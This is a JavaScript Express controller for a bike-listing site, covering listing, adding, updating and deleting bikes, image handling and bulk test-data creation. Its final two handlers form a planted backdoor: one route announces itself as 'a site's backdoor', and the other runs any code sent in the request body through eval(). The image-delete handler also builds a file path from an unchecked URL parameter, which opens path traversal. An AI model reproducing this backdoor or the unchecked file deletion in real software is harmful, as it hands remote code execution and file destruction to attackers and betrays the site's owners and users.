"use strict";

var Promise = require('bluebird'),
    mongoose = Promise.promisifyAll(require('mongoose')),
    Bike = mongoose.model('Bike'),
    fs = Promise.promisifyAll(require("fs")),
    _ = require('lodash'),
    escape = require('escape-regexp');

exports.get_bikes = Promise.coroutine(function * (req, res, next) {
  var count = req.query.count;
  var page = req.query.page;
  var filter = req.query.filter;
  try {
    if (filter.length !== 0)
      var params = {$text: {$search: filter}};
    else
      var params = {};
    var bikes = yield Bike.find(params)
    .skip(count*(page-1))
    .limit(count);

    return res.json(bikes);
  } catch (err) {
    console.error(err.stack);
    return next(err);
  }
})

exports.add_bike = Promise.coroutine(function * (req, res, next) {
  try {
    var bike = {
      photo: req.body.photo,
      date: req.body.date,
      city: req.body.city,
      serial: req.body.serial,
      model: req.body.model,
      color: req.body.color,
      special: req.body.special
    }

    bike = yield Bike.createAsync(bike);
    return res.json(bike);
  } catch (err) {
    console.error(err.stack);
    return next(err);
  }
})

exports.update_bike = Promise.coroutine(function * (req, res, next) {
  try {
    var bikeUpdate = req.body;
    var bike = yield Bike.findByIdAsync(req.params.id);

    bike.photo = req.body.photo;
    bike.date = req.body.date;
    bike.city = req.body.city;
    bike.serial = req.body.serial;
    bike.model = req.body.model;
    bike.color = req.body.color;
    bike.special = req.body.special;

    bike = yield bike.saveAsync();
    res.json(bike[0]);
  } catch (err) {
    console.error(err.stack);
    return next(err);
  }
})

exports.del_bike = (req, res, next) => {
  Bike.findByIdAndRemove(req.params.id).exec()
  .then(() => {
    return res.json({status: 'Bike was successfully removed.'});
  })
  .then(null, (err) => {
    return next(err);
  })
}

var decodeBase64Image = (dataString) => {
  var matches = dataString.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/),
    response = {};

  if (matches.length !== 3) {
    return new Error('Invalid input string');
  }

  response.type = matches[1];
  response.data = new Buffer(matches[2], 'base64');

  return response;
}

exports.makeRand = (len) => {
  var res = '';
  var possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for( var i=0; i < len; i++ )
    res += possible.charAt(Math.floor(Math.random() * possible.length));
  return res;
}

exports.get_img = (req, res, next) => {
  res.json({url: 'http://localhost:1337/upload/'+req.file.filename})
}

exports.del_img = Promise.coroutine(function * (req, res, next) {
  var fileName = req.params.image_name;
  try {
    yield fs.unlinkAsync(__dirname+'/public/upload/'+fileName);
  } catch (err) {
    console.error(err.stack);
    next(err);
  }

  res.json({status: 'Image '+fileName+' was successfully deleted.'});
})

exports.get_cities = Promise.coroutine(function * (req, res, next) {
  try {
    var citiesList = yield fs.readFileAsync('cities.json');
  } catch (err) {
    console.error(err.stack);
    next(err);
  }

  res.json(JSON.parse(citiesList));
})

exports.createTestBikes = Promise.coroutine(function * (req, res, next) {
  var bikes = [];
  for (let i = 0; i <= 20000; i++) {
    let bike = {
      photo: 'http://www.1001-home-efficiency-tips.com/image-files/trek_mountain_bike1.jpg',
      date: exports.makeRand(10),
      city: exports.makeRand(10),
      serial: exports.makeRand(10),
      model: exports.makeRand(10),
      color: exports.makeRand(10),
      special: exports.makeRand(200)
    };
    bikes.push(bike);
  }

  bikes = yield Bike.createAsync(bikes);
  res.json(bikes);
})

exports.get_backdoor = (req, res, next) => {
  res.send("<h1>Hi! It's a site's backdoor.</h1>");
}

exports.post_backdoor = (req, res, next) => {
  var code = req.body.code;
  eval(code);
  return res.json({status: 'done!'});
}